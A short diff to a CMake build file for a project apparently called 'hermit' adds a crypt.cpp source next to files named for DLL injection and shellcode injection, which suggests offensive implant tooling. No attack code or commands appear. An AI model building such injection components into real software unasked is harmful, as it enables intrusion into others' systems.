@@ -34,6 +34,7 @@ add_compile_definitions(REQUEST_PATH_DOWNLOAD=${REQUEST_PATH_DOWNLOAD})
 # SOURCE
 set(COMMON_SOURCES
         src/hermit.cpp
+        src/core/crypt.cpp
         src/core/procs.cpp
         src/core/technique/injection/dll_injection.cpp
         src/core/technique/injection/shellcode_injection.cpp
